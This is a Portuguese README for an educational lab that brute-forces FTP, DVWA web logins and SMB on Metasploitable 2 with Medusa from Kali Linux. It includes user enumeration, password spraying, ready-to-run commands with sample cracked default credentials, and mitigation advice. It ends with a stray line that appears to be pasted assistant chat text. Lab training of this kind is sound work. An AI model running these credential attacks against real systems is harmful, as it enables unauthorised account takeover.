# dio-lab-forcebrute-kalilinux-medusa
Este repositório documenta um projeto prático de cybersecurity educacional, utilizando Kali Linux, a ferramenta Medusa, e ambientes vulneráveis como Metasploitable 2 e DVWA.

# **Projeto Prático – Ataques de Força Bruta com Kali Linux + Medusa em Ambientes Vulneráveis**

## **1. Objetivo**

Implementar e documentar testes de força bruta utilizando **Kali Linux** e a ferramenta **Medusa**, explorando serviços vulneráveis em ambientes de prática como **Metasploitable 2** e **DVWA**, além de demonstrar técnicas de **password spraying** com enumeração de usuários.
Ao final, propor medidas de **mitigação**.

---

# **2. Configuração do Ambiente**

## **2.1. Máquinas Virtuais**

| Máquina | Sistema          | Função          |
| ------- | ---------------- | --------------- |
| **VM1** | Kali Linux       | Atacante        |
| **VM2** | Metasploitable 2 | Alvo vulnerável |

## **2.2. Configuração de Rede**

No VirtualBox → Configurações da VM → Rede:

* Adaptador 1 → **Host-only Adapter**
* Verifique o IP de cada máquina:

### **No Kali:**

```bash
ip addr
```

### **No Metasploitable:**

```bash
ifconfig
```

Exemplo possível:

* Kali: `192.168.56.10`
* Metasploitable: `192.168.56.101`

---

# **3. Preparação das Wordlists Simples**

Crie duas listas básicas no Kali:

### **users.txt**

```bash
echo "msfadmin" > users.txt
echo "user" >> users.txt
echo "admin" >> users.txt
```

### **passwords.txt**

```bash
echo "msfadmin" > passwords.txt
echo "123456" >> passwords.txt
echo "password" >> passwords.txt
```

---

# **4. Ataques Simulados com Medusa**

---

# **4.1. Força Bruta em FTP (Metasploitable 2)**

O serviço FTP está ativo por padrão.

### **Comando Medusa – FTP**

```bash
medusa -h 192.168.56.101 -u msfadmin -P passwords.txt -M ftp
```

### **Explicação:**

* `-h` = host alvo
* `-u` = usuário específico
* `-P` = wordlist de senhas
* `-M ftp` = módulo FTP

### **Resultado Esperado**

Acesso obtido com:

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin
```

---

# **4.2. Força Bruta em Formulário Web – DVWA (Brute Force Page)**

## **4.2.1. Habilitar DVWA no Metasploitable**

Acesse:

```
http://192.168.56.101/dvwa
```

Coloque o DVWA em **Low Security**.

## **4.2.2. Descobrir o Request do Formulário**

Use o BurpSuite ou o próprio navegador (Inspecionar → Network) para identificar os parâmetros enviados.

Exemplo típico:

* URL: `/dvwa/vulnerabilities/brute/`
* Método: POST
* Campos: `username`, `password`, `Login`

## **4.2.3. Criar arquivo de requisição**

Salve um template para Medusa:

### **dvwa.req**

```
POST /dvwa/vulnerabilities/brute/ HTTP/1.1
Host: 192.168.56.101
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

username=^USER^&password=^PASS^&Login=Login
```

## **4.2.4. Comando Medusa – HTTP Form**

```bash
medusa -h 192.168.56.101 -u admin -P passwords.txt -M http -m FORM:/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login -m DENY:Login failed
```

### **Explicação:**

* `-M http` = módulo HTTP
* `-m FORM:` = dados do form
* `-m DENY:` = frase que indica falha de login

### **Resultado Esperado**

```
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password
```

---

# **4.3. Password Spraying em SMB com Enumeração de Usuários**

## **4.3.1. Enumeração de usuários no SMB**

### **Usando enum4linux**

```bash
enum4linux -U 192.168.56.101 | grep 'user:'
```

Saída típica:

```
user: msfadmin
user: user
user: service
```

## **4.3.2. Ataque de Password Spraying**

Usando a mesma senha para vários usuários:

### **Comando Medusa – SMB**

```bash
medusa -h 192.168.56.101 -U users.txt -p msfadmin -M smbnt
```

### **Explicação:**

* `-U` = lista de usuários
* `-p` = senha única (spraying)
* `-M smbnt` = módulo SMB/NT

### **Resultado Esperado**

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin
```

---

# **5. Validação dos Acessos**

Depois de descobrir credenciais, teste:

### **FTP**

```bash
ftp 192.168.56.101
```

### **SMB**

```bash
smbclient -L \\192.168.56.101 -U msfadmin
```

### **DVWA**

Login via navegador:

```
http://192.168.56.101/dvwa
```

---

# **6. Recomendações de Mitigação**

### 🔐 **Fortalecer senhas**

* Política mínima de 10+ caracteres
* Bloqueio após tentativas excessivas

### 🛡️ **Ativar Fail2ban ou SSHGuard**

Bloqueio automático após repetidos erros.

### 🔥 **Restringir serviços**

* Desativar FTP → usar SFTP
* Restringir SMB a redes internas

### 🌐 **Proteção web**

* CAPTCHA
* Rate limiting
* MFA

### 📈 **Monitoramento**

* Logs de autenticação
* SIEM/SOC quando aplicável

---

# **7. Conclusão**

Este projeto demonstra, em laboratório seguro:

* Ataques de força bruta com Medusa
* Uso de wordlists simples
* Exploração de FTP, DVWA e SMB
* Password spraying e enumeração
* Boas práticas de mitigação

Se quiser, posso **gerar isso em PDF, Word, com capas**, ou formatar como **trabalho acadêmico**, **relatório técnico** ou **passo a passo com imagens**. Quer que eu gere o documento final?
